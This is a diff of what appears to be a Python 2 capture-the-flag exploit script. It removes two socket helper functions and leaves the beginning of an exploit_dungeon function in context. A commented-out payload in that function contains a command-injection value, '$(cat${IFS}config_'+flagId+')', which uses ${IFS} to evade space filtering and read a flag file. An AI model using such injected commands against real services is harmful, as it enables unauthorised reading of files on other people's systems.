@@ -25,36 +25,6 @@ def netcat(hostname, port, content):
     s.close()
     return ret_list
 
-def readData(s):
-    #data = s.recv(1024)
-    #return data
-    #'''
-    ret_list = []
-    i = 0
-    while i<10:
-        data = s.recv(1024)
-        print repr(data)
-        if data == "":
-            break
-        ret_list.append(repr(data))
-        i += 1
-    return ret_list
-    #'''
-
-def chattingnetcat(hostname, port, contentArr):
-    print 'content:', contentArr
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect((hostname, port))
-    ret_list = readData(s)
-    print 'here:', ret_list
-    for i in range(len(contentArr)):
-        s.sendall(contentArr[i])
-        ret_list = readData(s)
-        print ret_list
-    s.shutdown(socket.SHUT_WR)
-    s.close()
-    return ret_list
-
 def exploit_dungeon(hostname, port, flagId):
     print 'hostname:',hostname, 'port:',port, 'flagId:', flagId
     #content = ['2016'+ "\n"]#, 'east' + "\n", '1' + "\n", 'east'+"\n", 'get '+flagId + "\n"]# + '1' + "\n" + 'get '+flagId + "\n" #+ 'a' + "\n" + '$(cat${IFS}config_'+flagId+')' "\n"+ 's'+ "\n"
